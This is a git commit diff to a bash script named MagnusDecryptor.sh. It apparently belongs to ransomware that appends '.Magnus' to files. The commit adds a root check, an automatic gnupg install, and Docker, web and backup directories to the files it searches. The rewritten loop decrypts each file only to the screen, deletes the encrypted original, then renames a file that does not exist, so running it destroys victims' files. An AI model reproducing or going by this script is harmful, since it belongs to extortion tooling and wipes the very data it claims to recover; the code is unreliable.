b86ae118969775cb1d309fce30ae30e7b2acc42d
Twemlow <79366364+TwemlowsEmrys@users.noreply.github.com>
2023-01-16 19:42:13 +0000

    MagnusDecryptor.sh

--- MagnusDecryptor.sh
+++ MagnusDecryptor.sh
@@ -1,22 +1,33 @@
 #!/bin/bash
 
-if ! [ -x "$(command -v gpg)" ]; then
-  echo 'Error: gpg is not installed. Please install gpg and run the script again.'
-  exit 1
+if [[ $EUID -ne 0 ]]; then
+    echo "you must have root perms to run this script!"
+    exit 1
 fi
 
-read -p "Enter the decryption password: " password
+if ! [ -x "$(command -v gpg)" ]; then
+    echo 'Error: gpg is not installed. Installing gpg...'
+    apt-get update && apt-get install -y gnupg
+    echo 'gpg has been installed'
+else
+    echo 'gpg is already installed'
+fi
 
-target_dir_1="/home"
-target_dir_2="/var/www"
-target_dir_3="/home/backups"
-target_dir_4="/var/backups"
+read -p "Enter the password for decryption: " password
 
-for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 -type f -name "*.Magnus"); do
+echo "Decryption in progress..."
 
+target_dir_1="/var/lib/docker/volumes"
+target_dir_2="/var/lib/docker/containers"
+target_dir_3="/home"
+target_dir_4="/var/www"
+target_dir_5="/home/backups"
+target_dir_6="/var/backups"
+
+for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type f -name "*.Magnus"); do
     echo "$password" | gpg --batch --yes --passphrase-fd 0 --decrypt "$file"
-
-    mv "$file" "${file%.Magnus}"
+    rm "$file"
+    mv "${file%.Magnus}" "$file"
 done
 
-echo "Decryption complete. Your files should now be accessible."
+echo "Decryption has finished!"
